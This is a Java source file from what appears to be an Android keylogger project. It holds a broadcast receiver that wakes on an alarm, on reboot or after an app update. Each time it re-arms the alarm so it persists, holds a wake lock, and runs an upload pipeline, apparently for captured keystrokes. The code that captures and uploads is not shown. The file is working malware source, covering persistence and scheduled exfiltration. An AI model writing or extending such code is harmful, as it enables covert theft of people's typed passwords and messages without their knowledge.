package com.bshu2.androidkeylogger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import android.util.Log;

/**
 * Runs the rotate/upload pipeline when the alarm fires and re-arms the next
 * one. Also re-arms after a reboot or an app update, because alarms are
 * dropped when the device restarts.
 */
public class UploadReceiver extends BroadcastReceiver {

    static final String ACTION_UPLOAD = "com.bshu2.androidkeylogger.action.UPLOAD";

    private static final String TAG = UploadPipeline.TAG;
    private static final long WAKE_LOCK_TIMEOUT_MS = 5L * 60L * 1000L;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent == null ? null : intent.getAction();
        Log.d(TAG, "alarm received: " + action);

        // Re-arm first: if the work below crashes or hangs, the chain survives.
        AlarmScheduler.schedule(context);

        final Context app = context.getApplicationContext();
        final PowerManager.WakeLock lock = acquireWakeLock(app);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    UploadPipeline.run(app);
                } catch (Exception e) {
                    Log.e(TAG, "scheduled upload failed", e);
                } finally {
                    if (lock != null && lock.isHeld()) {
                        try {
                            lock.release();
                        } catch (Exception ignored) {
                            // Already released; nothing useful to do.
                        }
                    }
                }
            }
        }, "keylogger-alarm").start();
    }

    private static PowerManager.WakeLock acquireWakeLock(Context ctx) {
        PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        if (pm == null) return null;
        try {
            PowerManager.WakeLock lock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK, "keylogger:upload");
            lock.setReferenceCounted(false);
            lock.acquire(WAKE_LOCK_TIMEOUT_MS);
            return lock;
        } catch (Exception e) {
            Log.e(TAG, "could not acquire wake lock", e);
            return null;
        }
    }
}
